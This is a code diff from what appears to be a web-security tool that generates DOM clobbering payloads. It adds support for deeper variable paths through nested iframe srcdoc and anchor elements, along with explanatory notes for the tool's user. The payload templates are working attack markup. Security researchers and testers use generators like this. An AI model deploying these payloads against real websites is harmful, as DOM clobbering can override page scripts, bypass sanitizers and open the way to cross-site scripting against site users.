@@ -119,9 +119,37 @@
                     if (documentScope) {
                         setNote('Unable to set the value of this variable, retry without "document." or by using "window." instead.');
                     } else {
-                        setNote('The variable will be defined, but the variable value will be inside the ".value" property.');
+                        setNote(`The variable "${variableName}" will be defined, but the variable\'s value will be inside the "${variableName}.value" property.`);
                         payloads.push(`<form id="${first}" name="${second}">\n\t<input id="${third}" value="${variableValue}">\n</form>\n<form id="${first}">`);
                     }
+                } else {
+                    setNote('You need "form" and "input" to generate a payload of this depth.');
+                }
+            } else if (depth === 4) {
+                const [first, second, third, fourth] = variableName.split(".");
+
+                if (ALLOWED_ELEMENTS.includes("iframe") && ALLOWED_ELEMENTS.includes("a")) {
+                    setNote(`The variable "${variableName}" will be defined, but the variable\'s value will be inside the "${variableName}.value" property.`);
+                    payloads.push(`<iframe name="${first}" srcdoc="<iframe name='${second}' srcdoc='<a id=${third}></a><a name=${fourth} id=${third} href=${variableValue}></a>'></iframe>"></iframe>`);
+                } else {
+                    setNote('You need "iframe" and "a" to generate a payload of this depth.');
+                }
+            } else {
+                const elements = variableName.split(".");
+                if (ALLOWED_ELEMENTS.includes("iframe") && ALLOWED_ELEMENTS.includes("a")) {
+                    setNote(`The variable "${variableName}" will be defined, but the variable\'s value will be inside the "${variableName}.value" property.`);
+
+                    var payload = "";
+                    for (let i = 0; i < elements.length - 1; i++) {
+                        payload += quoteEncode(`<iframe name=${elements[i]} srcdoc="`, i);
+                    }
+                    payload += quoteEncode(`<a id="${elements[elements.length-1]}" href="${variableValue}"></a>`, elements.length - 1);
+                    for (let i = elements.length - 2; i >= 0; i--) {
+                        payload += quoteEncode(`"></iframe>`, i);
+                    }
+                    payloads.push(payload);
+                } else {
+                    setNote('You need "iframe" and "a" to generate a payload of this depth.');
                 }
             }
 
